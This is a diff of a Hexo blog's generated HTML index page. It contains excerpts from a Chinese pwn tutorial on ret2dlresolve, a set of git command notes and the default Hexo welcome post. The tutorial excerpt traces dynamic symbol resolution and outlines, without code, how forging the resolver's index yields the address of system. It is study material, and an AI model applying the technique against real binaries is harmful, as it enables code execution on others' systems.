+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PWN/ROP之ret2dlresolve" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ROP之ret2dlresolve</p>
+<h3 id="ROP之ret2dlresolve"><a href="#ROP之ret2dlresolve" class="headerlink" title="ROP之ret2dlresolve"></a><strong>ROP之ret2dlresolve</strong></h3><p>首先以一个程序看起，了解其真正的延迟加载过程</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/e80712df161361a0b45af9cbcc49dc21.png" alt="1.png"></p>
+<p>这里call 了read函数，由于是第一次调用，所以需要从libc中查找出对应函数，来研究下它具体的过程是如何的。</p>
+<p>si步入，其进入了read的plt表，并且将要跳转，由图可知，他其实就是跳转到其下一条语句并且会push一个0</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/b2427b3908110ba5da04514b7d702997.png" alt="2.png"></p>
+<p>继续si，跑完push 0x0,栈被推进了一个新值，这个值是十分有用的，后续将会讲解其具体作用。接下来，它将会跳转到0x80482d0，这个位置是plt[0]的位置，来看一下。</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/958b6916d55e05b8855ae237f1d90081.png" alt="3.png"><br>从IDA中查看一下plt[0]的位置<br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/5f193d8487bed71f6d0056df98f164c6.png" alt="4.png"><br>再通过objdump查看一下</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/198dc0f4bc3ccbdfc3dd7756c7c0106b.png" alt="5.png"><br>完全一致。</p>
+<p>它跳到这里是要为了什么呢，继续往下看。在这里，它push进去了一个值，这个值是一个十分重要的数据结构的指针，名为linkmap，这个结构里面存储了许多关于libc的信息。</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/94770742f9b8585430a5aa3bfe6cf6e1.png" alt="6.png"><br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/a1f557dfe5b438dab95938a211703572.png" alt="7.png"></p>
+<p>图中，栈被推进了一个新值，这个便是linkmap的指针，其中存储了许许多多关于libc的信息，这个结构也是十分重要的，我们在本次学习中并不需要掌握linkmap的具体结构。在图中我们可以看到，再下来这个jmp 将会跳至0xf7fead80执行，这说明我们的程序已经传递完了其该传递的参数，libc会根据其参数获取read函数的真正地址。我们现在已知的参数就只有两个，一个为0，一个为linkmap的指针，这两个参数怎么找到read函数的地址，请继续往下看。</p>
+<p>由于ida与objdump所查找的地址信息一致，所以我是用ida查找地址，更加快捷，当然objdump也可以。</p>
+<p>先看0能使我们找到什么信息。</p>
+<p>程序会 先到.rel.plt(JMPREL) 中去取下标为0的数据</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/410813013ec54a87704c1a3b5a9dbe2d.png" alt="8.png"><br>其中的数据为下图，从ida中也可以很快的看出来<br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/a7e7521ad7d1d0056cf9fb4fc7925c4a.png" alt="9.png"><br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/83005ad35170acb24f08bcf74a467e58.png" alt="10.png"><br>后面的0x107的作用如下：</p>
+<p>在实际运算中，0x107会被右移8位得到0x1，0x1会被作为下标，在.dynsym(SYMTAB)中查找对应的值，.dynsym的地址如下：<br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/e1e582f5e2fd5bbcbf2d53176dacdda5.png" alt="11.png"><br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/9be1027e9561ec754d0ee361253a03c7.png" alt="12.png"><br>它会根据gdb中显示的0x1a（即IDA中的 offset aRead - offset byte_804821C 值）继续寻找。</p>
+<p>接下来会将0x1a带入.dynstr(STRTAB)中查找，这次并不是作为下标带入，而是直接用.dynstr的地址 + 0x1a</p>
+<p><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/46eb463baaaac47c3480c3512614ed5c.png" alt="13.png"><br><img src="/2019/09/10/PWN/ROP之ret2dlresolve/_resources/ce99ad2676dfec4137d5effb0c921e68.png" alt="14.png"><br>这样便拿到了字符串“read”，libc便知道要查找read的地址。libc从哪来，linkmap便是用来查找它的。</p>
+<p>libc具体的查找策略先不谈，具体是通过Hash实现的，感兴趣的可以自行研究。</p>
+<p>接下来就是攻击方法了，通过上面的跟踪，我们知道其实就是根据call read时栈里先被push进去的0，查找出来最终的字符串“read”,libc只是拿着字符串read去查找地址。那么我们可以通过控制最先push进去的0，写成一个可控的值，使其与.rel.plt结合查找出来的地址可控，并且该地址存储的值也可控，那么我们就可以继续控制0x107,使其与.dynsym查找出来的地址里存储的值可控，进而控制0x1a，使其与.dynstr相加后得到的地址存储的字符串可控，进而获取到真正的system地址。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/ROP之ret2dlresolve/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonPIL简单编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.609Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-GIT/GIT游戏" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>GIT游戏</p>
+<p><a href="http://[https://learngitbranching.js.org/]" target="_blank" rel="noopener">学习网址 [https://learngitbranching.js.org/]</a></p>
+<ol>
+<li><p>git checkout -b bugFix 创建名为bugFix的分支并切换过去</p>
+</li>
+<li><p>git checkout -b foo o/master 创建一个foo分支，追踪o/master分支，并转到foo分支上</p>
+</li>
+<li><p>git branch -u o/master foo  使得 foo 跟踪 o/master 。如果当前就在 foo 分支上, 还可以省略 foo</p>
+</li>
+<li><p>git merge 合并所有分支</p>
+</li>
+<li><p>git merge bugFix 在当前分支(HEAD指向的位置)上合并bugFix分支</p>
+</li>
+<li><p>git rebase master 合并当前分支到master分支</p>
+</li>
+<li><p>git rebase o/master side1 把side1合并到o/master上</p>
+</li>
+<li><p>git rebase -i HEAD~4 交互rebase，分支为HEAD上移4位的分支</p>
+</li>
+<li><p>git symbolic-ref HEAD 查看head指针所指的位置</p>
+</li>
+<li><p>git checkout a1c58 分离head,将head指向a1c58</p>
+</li>
+<li><p>使用 ^ 向上移动 1 个提交记录</p>
+</li>
+<li><p>使用 ~<num> 向上移动多个提交记录，如 ~3</num></p>
+</li>
+<li><p>git branch -f master HEAD~3 会将 master 分支强制指向 HEAD 的第 3 级父提交。</p>
+</li>
+<li><p>git branch -f bugFix c0 把bugFix强制移到c0处</p>
+</li>
+<li><p>git reset HEAD~1 把head指针移向他的第一级父提交 此时的结构 c2 -&gt; c1(master*)</p>
+</li>
+<li><p>git revert HEAD head指针下移，此时的结构 c1’(master*) -&gt; c2 -&gt; c1</p>
+</li>
+<li><p>git cherry-pick &lt;提交号&gt; 把这个提交放在head下面</p>
+</li>
+<li><p>交互式 rebase 指的是使用带参数 –interactive 的 rebase 命令, 简写为 -i</p>
+</li>
+<li><p>git tag v1 c1 在c1处打上v1的标签，如果不指定c1,则默认为HEAD指向的位置</p>
+</li>
+<li><p>git describe用来描述离你最近的锚点(也就是标签),能帮你在提交历史中移动了多次以后找到方向；当你用 git bisect（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令</p>
+</li>
+<li><p>git describe <ref> 默认ref为HEAD</ref></p>
+</li>
+<li><p>git checkout HEAD<del>^2</del>2 第一个<del>HEAD指针上移，^2HEAD指针指向他的第二个父节点，</del>2HEAD上移2个</p>
+</li>
+<li><p>git pull 就是 fetch 和 merge 的简写，类似的 git pull –rebase 就是 fetch 和 rebase</p>
+</li>
+<li><p>git pull origin master 从远程仓库获取master分支到本地，然后merge</p>
+</li>
+<li><p>git pull origin master:foo 本地创建一个foo分支，远程仓库下载master分支，合并到foo分支上，在merge</p>
+</li>
+<li><p>git push <remote> <place> ,git push origin master:切到本地仓库中的“master”分支，获取所有的提交，再到远程仓库“origin”中找到“master”分支，将远程仓库中没有的提交记录都添加上去，搞定之后告诉我</place></remote></p>
+</li>
+<li><p>git push origin <source>:<destination>,git push origin foo^:master 把foo的第1级父提交指向的节点送给远程master分支，如果不存在，则创建后在送</destination></p>
+</li>
+<li><p>git push origin :foo push空source到远程仓库，会删除远程仓库的foo分支</p>
+</li>
+<li><p>git fetch origin :bar fetch空的source到本地，会在本地创建一个新分支</p>
+</li>
+</ol>
+<p><img src="/2019/09/10/GIT/GIT游戏/_resources/50fadb7d7c2a70c07ec3ef338c1e7bec.jpg" alt="git.jpg"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/GIT/GIT游戏/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.592Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/hello-world/">Hello World</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/hello-world/" class="archive-article-date">
+  	<time datetime="2019-09-10T07:14:32.376Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/hello-world/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python 邮件编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.575Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PWN/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.559Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
+
+
+  
+  
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
     </nav>
   
 
@@ -397,9 +760,9 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: false,
+		isHome: true,
 		isPost: false,
-		isArchive: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
